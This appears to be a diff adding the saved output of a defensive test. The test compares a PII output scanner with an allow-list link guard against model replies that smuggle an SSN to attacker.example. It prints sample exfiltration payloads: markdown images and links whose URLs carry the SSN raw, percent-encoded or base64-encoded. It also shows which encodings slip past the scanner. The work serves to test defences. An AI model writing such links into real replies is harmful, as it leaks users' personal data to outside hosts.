@@ -1,0 +1,18 @@
+== output scanner alone: what it found, and what it let out ==
+plain text      found US_SSN      still leaks: False
+                -> Your SSN on file is <US_SSN>.
+image, raw      found URL,US_SSN  still leaks: False
+                -> Done. ![s](https://attacker.example/<URL>g?d=<US_SSN>)
+image, percent  found URL         still leaks: True
+                -> Done. ![s](https://attacker.example/<URL>g?d=%39%30%30%2D%31%32%2D%33%34%35%36)
+image, base64   found URL         still leaks: True
+                -> Done. ![s](https://attacker.example/<URL>g?d=OTAwLTEyLTM0NTY=)
+link, base64    found nothing     still leaks: True
+                -> See [record](https://attacker.example/r?id=OTAwLTEyLTM0NTY=).
+
+== link guard (allow-listed hosts only), then the scanner ==
+plain text      removed -                      -> Your SSN on file is <US_SSN>.
+image, raw      removed ['attacker.example']   -> Done. 
+image, percent  removed ['attacker.example']   -> Done. 
+image, base64   removed ['attacker.example']   -> Done. 
+link, base64    removed ['attacker.example']   -> See record.
